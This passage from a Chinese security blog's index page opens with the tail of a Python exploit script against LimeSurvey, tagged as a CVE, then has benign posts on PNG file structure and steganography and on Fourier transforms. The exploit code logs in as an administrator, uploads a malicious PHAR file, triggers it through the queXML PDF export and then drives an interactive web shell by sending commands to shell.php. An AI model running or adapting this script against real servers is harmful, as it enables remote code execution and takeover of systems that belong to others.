surveyid):</span><br><span class="line">	token = getYIICSRFToken(url_pdf_export + surveyid)</span><br><span class="line">	data = &#123;&quot;save_language&quot; : &quot;en&quot;,</span><br><span class="line">	        &quot;queXMLStyle&quot;   : &apos;&lt;h1&gt;Stage 2&lt;/h1&gt;&lt;img src=&quot;phar://./upload/surveys/&apos;+ surveyid + &apos;/files/malicious.jpg&quot;&gt;&apos;,</span><br><span class="line">	        &quot;queXMLSingleResponseAreaHeight&quot; : &quot;9&quot;,</span><br><span class="line">	        &quot;queXMLSingleResponseHorizontalHeight&quot; : &quot;10.5&quot;,</span><br><span class="line">	        &quot;queXMLQuestionnaireInfoMargin&quot; : &quot;5&quot;,</span><br><span class="line">	        &quot;queXMLResponseTextFontSize&quot; : &quot;10&quot;,</span><br><span class="line">	        &quot;queXMLResponseLabelFontSize&quot; : &quot;7.5&quot;,</span><br><span class="line">	        &quot;queXMLResponseLabelFontSizeSmall&quot; : &quot;6.5&quot;,</span><br><span class="line">	        &quot;queXMLSectionHeight&quot; : &quot;18&quot;,</span><br><span class="line">	        &quot;queXMLBackgroundColourSection&quot; : &quot;221&quot;,</span><br><span class="line">	        &quot;queXMLBackgroundColourQuestion&quot; : &quot;241&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingSingleChoiceHorizontal&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingSingleChoiceHorizontal&quot; : &quot;1&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingSingleChoiceVertical&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingSingleChoiceVertical&quot; : &quot;1&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingMatrixText&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingMatrixText&quot; : &quot;1&quot;,</span><br><span class="line">	        &quot;queXMLAllowSplittingVas&quot; : &quot;0&quot;,</span><br><span class="line">	        &quot;queXMLPageOrientation&quot; : &quot;P&quot;,</span><br><span class="line">	        &quot;queXMLPageFormat&quot; : &quot;A4&quot;,</span><br><span class="line">	        &quot;queXMLEdgeDetectionFormat&quot; : &quot;lines&quot;,</span><br><span class="line">	        &quot;YII_CSRF_TOKEN&quot; : token,</span><br><span class="line">	        &quot;ok&quot; : &quot;Y&quot;&#125;</span><br><span class="line">	res = post(url_pdf_export + surveyid, data)</span><br><span class="line">	return res        </span><br><span class="line"></span><br><span class="line">def shell(url):</span><br><span class="line">    r = requests.get(&quot;%s/shell.php&quot; % url)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">       print &quot;[+] Pwned! :)&quot;</span><br><span class="line">       print &quot;[+] Getting the shell...&quot;</span><br><span class="line">       while 1:</span><br><span class="line">           try:</span><br><span class="line">               input = raw_input(&quot;$ &quot;)</span><br><span class="line">               r = requests.get(&quot;%s/shell.php?c=%s&quot; % (url, input))</span><br><span class="line">               print r.text</span><br><span class="line">           except KeyboardInterrupt:</span><br><span class="line">               sys.exit(&quot;\nBye kaker!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[*] The site seems not to be vulnerable :(&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    usage()</span><br><span class="line">    url      = sys.argv[1] # URL</span><br><span class="line">    username = sys.argv[2] # Username</span><br><span class="line">    password = sys.argv[3] # Password</span><br><span class="line">    url_login = &quot;%s/index.php/admin/authentication/sa/login&quot; % url</span><br><span class="line"></span><br><span class="line">    print &quot;[*] Logging in to LimeSurvey...&quot;</span><br><span class="line">    if login(url_login, username, password):</span><br><span class="line"></span><br><span class="line">        url_newsurvey = &quot;%s/index.php/admin/survey/sa/newsurvey&quot; % url</span><br><span class="line">        url_insert = &quot;%s/index.php/admin/survey/sa/insert&quot; % url</span><br><span class="line"></span><br><span class="line">        print &quot;[*] Creating a new Survey...&quot;</span><br><span class="line">        surveyid = createSurvey(url_newsurvey, url_insert) </span><br><span class="line">        print &quot;[+] SurveyID: %s&quot; % surveyid</span><br><span class="line"></span><br><span class="line">        email_templates = &quot;%s/index.php/admin/emailtemplates/sa/index/surveyid/%s&quot; % (url, surveyid)</span><br><span class="line"></span><br><span class="line">        emailTemplates(email_templates)</span><br><span class="line"></span><br><span class="line">        url_csrf_token = &quot;%s/third_party/kcfinder/browse.php?opener=custom&amp;type=files&amp;CKEditor=email_invitation_en&amp;langCode=en&quot; % url</span><br><span class="line">        url_upload     = &quot;%s/third_party/kcfinder/browse.php?type=files&amp;lng=en&amp;opener=custom&amp;act=upload&quot; % url</span><br><span class="line"></span><br><span class="line">        print &quot;[*] Uploading a malicious PHAR...&quot;</span><br><span class="line">        uploadPHAR(url_upload, url_csrf_token, PHAR)</span><br><span class="line"></span><br><span class="line">        url_pdf_export = &quot;%s/index.php/admin/export/sa/quexml/surveyid/&quot; % url</span><br><span class="line"></span><br><span class="line">        print &quot;[*] Sending the Payload...&quot;</span><br><span class="line">        export_response = pdfExport(url_pdf_export, surveyid)</span><br><span class="line">        print &quot;[*] TCPDF Response: %s&quot; % export_response</span><br><span class="line"></span><br><span class="line">        shell(url)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[-] Bad credentials :(&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/cve/">cve</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/10/misc/png隐写/"><span>png文件结构与信息隐藏</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/10/misc/png隐写/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-10T07:28:24.487Z">
          2019-04-10
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="png文件结构与信息隐藏"><a href="#png文件结构与信息隐藏" class="headerlink" title="png文件结构与信息隐藏"></a>png文件结构与信息隐藏</h1><p><strong>PNG(Portable Network Graphics)</strong>，PNG supports palette-based images (with palettes of 24-bit RGB or 32-bit RGBA colors), grayscale images (with or without alpha channel for transparency), and full-color non-palette-based RGB/RGBA images (with or without alpha channel).</p>
<h2 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h2><h3 id="file-header"><a href="#file-header" class="headerlink" title="file header"></a>file header</h3><p>固定的8byte：<br>89 50 4E 47 0D 0A 1A 0A<br>其中第一个字节0x89超出了ASCII字符的范围，这是为了避免某些软件将PNG文件当做文本文件来处理</p>
<h3 id="“Chunks”-within-the-file"><a href="#“Chunks”-within-the-file" class="headerlink" title="“Chunks” within the file"></a>“Chunks” within the file</h3><table>
<thead>
<tr>
<th>length</th>
<th>chunk type</th>
<th>chunk data</th>
<th>crc</th>
</tr>
</thead>
<tbody>
<tr>
<td>4byte</td>
<td>4byte</td>
<td>length</td>
<td>4bytes</td>
</tr>
</tbody>
</table>
<h3 id="关键数据块（critical-chunks）"><a href="#关键数据块（critical-chunks）" class="headerlink" title="关键数据块（critical chunks）"></a>关键数据块（critical chunks）</h3><p>(1) 文件头数据块IHDR(header chunk)</p>
<ul>
<li>包含PNG文件的基本信息</li>
</ul>
<ul>
<li>一个PNG数据流中只能有一个IHDR</li>
</ul>
<ul>
<li>必须在PNG文件最前面</li>
</ul>
<p>(2) 调色板数据块PLTE(palette chunk)</p>
<ul>
<li>包含有与索引彩色图像(indexed-color image)相关的彩色变换数据</li>
</ul>
<ul>
<li>必须在IDAT之前</li>
</ul>
<p>(3) 图像数据块IDAT(image data chunk)</p>
<ul>
<li>存储实际的数据</li>
</ul>
<ul>
<li>可存在多个</li>
</ul>
<ul>
<li>必须与其他IDAT连续</li>
</ul>
<p>(4) 图像结束数据IEND(image trailer chunk)</p>
<ul>
<li>固定格式，16进制为： 00 00 00 00 49 45 4E 44 AE 42 60 82</li>
</ul>
<ul>
<li>必须在PNG文件最尾部</li>
</ul>
<h4 id="IHDR详细结构"><a href="#IHDR详细结构" class="headerlink" title="IHDR详细结构"></a>IHDR详细结构</h4><table>
<thead>
<tr>
<th>域的名称</th>
<th>字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Width</td>
<td>4</td>
<td>图像宽度，以像素为单位</td>
</tr>
<tr>
<td>Height</td>
<td>4</td>
<td>图像高度，以像素为单位</td>
</tr>
<tr>
<td>Bit depth</td>
<td>1</td>
<td>图像深度：索引彩色图像：1，2，4或8; 灰度图像：1，2，4，8或16; 真彩色图像：8或16</td>
</tr>
<tr>
<td>ColorType</td>
<td>1</td>
<td>颜色类型：0：灰度图像, 1，2，4，8或16; 2：真彩色图像，8或16; 3：索引彩色图像，1，2，4或8; 4：带α通道数据的灰度图像，8或16; 6：带α通道数据的真彩色图像，8或16</td>
</tr>
<tr>
<td>Compression method</td>
<td>1</td>
<td>压缩方法(LZ77派生算法)</td>
</tr>
<tr>
<td>Filter method</td>
<td>1</td>
<td>滤波器方法</td>
</tr>
<tr>
<td>Interlace method</td>
<td>1</td>
<td>隔行扫描方法：0：非隔行扫描; 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
</tr>
</tbody>
</table>
<h3 id="辅助数据块（ancillary-chunks）"><a href="#辅助数据块（ancillary-chunks）" class="headerlink" title="辅助数据块（ancillary chunks）"></a>辅助数据块（ancillary chunks）</h3><p>用于辅助指示PNG图像中的层、文字等信息</p>
<p><strong>可删除，不影响图片浏览，但图像将失去原来的可编辑性</strong></p>
<p>(1) 背景颜色数据块bKGD(background color)</p>
<p>(2) 基色和白色度数据块cHRM(primary chromaticities and white point)</p>
<p>(3) 图像γ数据块gAMA(image gamma)</p>
<p>(4) 图像直方图数据块hIST(image histogram)</p>
<p>(5) 物理像素尺寸数据块pHYs(physical pixel dimensions)</p>
<p>(6) 样本有效位数据块sBIT(significant bits)</p>
<p>(7) 文本信息数据块tEXt(textual data)</p>
<p>(8) 图像最后修改时间数据块tIME (image last-modification time)</p>
<p>(9) 图像透明数据块tRNS (transparency)</p>
<p>(10) 压缩文本数据块zTXt (compressed textual data)</p>
<p><a href="https://www.cnblogs.com/masonzhang/p/10261855.html" target="_blank" rel="noopener">crc32原理</a></p>
<p>reference：<br><a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Portable_Network_Graphics</a><br><a href="https://www.cnblogs.com/lidabo/p/3701197.html" target="_blank" rel="noopener">https://www.cnblogs.com/lidabo/p/3701197.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/隐写技巧-利用PNG文件格式隐藏Payload/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/隐写技巧-利用PNG文件格式隐藏Payload/</a><br><a href="https://xz.aliyun.com/t/1833" target="_blank" rel="noopener">https://xz.aliyun.com/t/1833</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/隐写/">隐写</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/09/algorithm/傅里叶/"><span>傅里叶变换</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/09/algorithm/傅里叶/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-09T11:45:48.219Z">
          2019-04-09
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h1><p>傅里叶同学告诉我们，任何周期函数，都可以看作是不同振幅，不同相位正弦波的叠加</p>
<p>而贯穿时域与频域的方法之一，就是传中说的傅里叶分析。傅里叶分析可分为傅里叶级数（Fourier Serie）和傅里叶变换(Fourier Transformation)</p>
<p>如果我们把第一个频率最低的频率分量看作“1”，我们就有了构建频域的最基本单元。</p>
<p>对于我们最常见的有理数轴，数字“1”就是有理数轴的基本单元。</p>
<p>时域的基本单元就是“1秒”，如果我们将一个角频率为\omega<em>{0} 的正弦波cos（\omega</em>{0} t）看作基础，那么频域的基本单元就是\omega_{0} 。</p>
<p>有了“1”，还要有“0”才能构成世界，那么频域的“0”是什么呢？cos（0t）就是一个周期无限长的正弦波，也就是一条直线！所以在频域，0频率也被称为直流分量，在傅里叶级数的叠加中，它仅仅影响全部波形相对于数轴整体向上或是向下而不改变波的形状。</p>
<p>正弦波定义：一个圆周运动在一条直线上的投影。<br>所以频域的基本单元也可以理解为一个始终在旋转的圆</p>
<p><img src="https://pic3.zhimg.com/80/81ca9447d6c45c162c2d76df75a6690a_hd.jpg" alt=""></p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Fourier_series_square_wave_circles_animation.gif" alt=""></p>
<p>我们看似不规律的事情反而是规律的正弦波在时域上的投影，而正弦波又是一个旋转的圆在直线上的投影。</p>
<p><a href="https://zhuanlan.zhihu.com/p/19763358?columnSlug=wille" target="_blank" rel="noopener">一篇文章</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/傅里叶/">傅里叶</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/2/" class="pagination-prev">Prev</a>
  
  
  <a href="/page/4/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>